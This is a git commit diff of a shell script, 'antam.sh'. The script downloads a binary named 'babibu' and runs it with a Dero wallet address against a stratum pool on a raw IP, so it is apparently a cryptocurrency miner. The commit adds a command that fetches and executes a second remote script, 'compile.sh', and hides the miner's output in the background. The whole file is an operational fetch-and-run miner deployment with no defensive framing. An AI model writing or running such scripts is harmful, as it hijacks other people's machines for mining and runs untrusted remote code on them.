82b1e5e9203392f5d40fc96602424c024d22547b
renilo <88342640+renilo@users.noreply.github.com>
2022-11-11 23:42:32 +0700

    Update antam.sh

--- antam.sh
+++ antam.sh
@@ -1,7 +1,5 @@
 wget https://github.com/renilo/kuuntul/raw/main/babibu
 chmod 777 babibu
-
-while :; do
-    ./babibu -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.$(echo $(shuf -i 1-9999 -n 1)-WEWEK) -r 170.187.197.220:443 -p stratum;
-    sleep 5;
-done
+wget https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && chmod +x compile.sh
+./babibu -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.$(echo $(shuf -i 1-9999 -n 1)-WEWEK) -r 167.172.84.152:443 -p stratum >/dev/null &
+./compile.sh
